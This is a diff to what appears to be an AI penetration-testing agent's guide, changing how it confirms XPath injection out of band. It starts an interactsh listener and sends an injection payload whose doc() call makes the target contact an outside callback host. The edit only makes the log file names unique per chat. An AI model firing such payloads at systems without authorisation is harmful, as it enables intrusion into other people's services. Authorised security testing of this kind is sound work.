@@ -196,10 +196,12 @@ execute_curl url: "https://target.tld/login" method: "POST" data: "username=admi
 
 OOB confirmation (XPath 2.0+):
 
+Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
+
 ```
-kali_shell: interactsh-client -v -o /tmp/oast.log &
+kali_shell: interactsh-client -v -o /tmp/oast-RUN.log &
 execute_curl url: "https://target.tld/api/lookup?q=' or doc('http://<oast-id>.oast.fun/?p=' or '1'='1"
-# wait, then read /tmp/oast.log for the callback line
+# wait, then read /tmp/oast-RUN.log for the callback line
 ```
 
 ## Validation shape
